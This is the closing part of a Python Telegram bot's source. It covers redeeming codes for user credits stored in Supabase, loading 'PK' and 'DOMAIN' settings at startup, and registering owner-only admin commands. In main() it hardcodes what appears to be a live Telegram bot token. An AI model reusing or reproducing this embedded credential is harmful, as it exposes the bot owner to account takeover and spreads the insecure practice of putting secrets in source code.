                        await update.message.reply_text(
                            f"❌ *{escape_markdown('Error updating user credits in database. Please try again or contact support.', version=2)}*",
                            parse_mode='MarkdownV2')
                    except Forbidden:
                        print(
                            f"WARNING: Bot was blocked by user {user_id}. Cannot send credit update error."
                        )
                    print(
                        f"CRITICAL ERROR: Failed to UPDATE/CREATE user {user_id} credits."
                    )
                    return

                updated_credits = current_credits + credits_to_add

                delete_success = await delete_redeem_code_from_supabase(code)
                if not delete_success:
                    print(
                        f"WARNING: Failed to delete redeem code {code} after successful redemption."
                    )
                    pass

                credits_added_word = "credit" if credits_to_add == 1 else "credits"
                current_credits_word = "credit" if updated_credits == 1 else "credits"

                raw_success_message = f"🎉 Successfully redeemed {credits_to_add} {credits_added_word}!\nYou now have {updated_credits} {current_credits_word}."

                escaped_success_message_content = escape_markdown(
                    raw_success_message, version=2)
                final_display_message = f"*{escaped_success_message_content}*"

                try:
                    await update.message.reply_text(final_display_message,
                                                    parse_mode='MarkdownV2')
                except Forbidden:
                    print(
                        f"WARNING: Bot was blocked by user {user_id}. Cannot send redeem success message."
                    )
                except Exception as e:
                    print(
                        f"ERROR: Failed to send redeem success message. Error: {e}"
                    )
                    try:
                        await update.message.reply_text(escape_markdown(
                            "Redemption successful, but failed to send confirmation message\\. Check your profile for updated credits\\.",
                            version=2),
                                                        parse_mode='MarkdownV2'
                                                        )
                    except Forbidden:
                        print(
                            f"WARNING: Bot was blocked by user {user_id}. Cannot send fallback redeem message."
                        )

            else:
                try:
                    await update.message.reply_text(
                        f"❌ *{escape_markdown('Invalid or already used redeem code', version=2)}*\\.",
                        parse_mode='MarkdownV2')
                except Forbidden:
                    print(
                        f"WARNING: Bot was blocked by user {user_id}. Cannot send invalid redeem message."
                    )
            return

    try:
        await context.bot.send_chat_action(chat_id=chat_id,
                                           action=ChatAction.TYPING)
        error_message_content = escape_markdown(
            "I didn't understand that command.", version=2)
        await update.message.reply_text(f"*{error_message_content}*",
                                        reply_markup=reply_markup,
                                        parse_mode='MarkdownV2')
    except Forbidden:
        print(
            f"WARNING: Bot was blocked by user {user_id}. Cannot send unrecognized command message."
        )


async def post_init(application: Application):

    await load_bot_settings_from_supabase()
    if not DOMAIN or not PK:
        print(
            "WARNING: PK or DOMAIN could not be loaded at startup. Bot may not function correctly."
        )
        print(
            "Please ensure 'bot_settings' table exists and has 'PK' and 'DOMAIN' entries, and RLS allows 'anon' role to read."
        )


def main():
    TOKEN = "7619525840:AAGOi8MTbklIZAi2dE4-b2TfWy6UbaaaFBI"
    application = Application.builder().token(TOKEN).post_init(
        post_init).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("credit",
                           generate_redeem_start,
                           filters=filters.User(OWNER_IDS))
        ],
        states={
            GENERATE_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND,
                               get_redeem_amount)
            ],
            GENERATE_CREDITS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND,
                               get_redeem_credits)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_generation)],
    )

    application.add_handler(conv_handler)

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(
        CommandHandler("nocredit",
                       nocredit_command,
                       filters=filters.User(OWNER_IDS)))

    application.add_handler(
        CommandHandler("add",
                       add_pk_domain_command,
                       filters=filters.User(OWNER_IDS)))

    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("\033[1;92m Bot Activated \033[0m")
    application.run_polling(poll_interval=3)


if __name__ == "__main__":
    main()
